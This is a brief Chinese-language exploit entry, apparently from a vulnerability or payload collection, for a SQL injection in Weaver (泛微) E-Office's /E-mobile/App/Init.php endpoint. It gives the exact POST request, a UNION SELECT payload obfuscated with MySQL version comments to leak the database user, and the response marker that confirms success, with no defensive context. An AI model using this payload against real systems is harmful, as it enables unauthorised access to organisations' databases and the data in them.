# 泛微OAE-OfficeInit.phpSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1`

**Payload**
```
cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
```
- **响应特征**：200 CC_NAME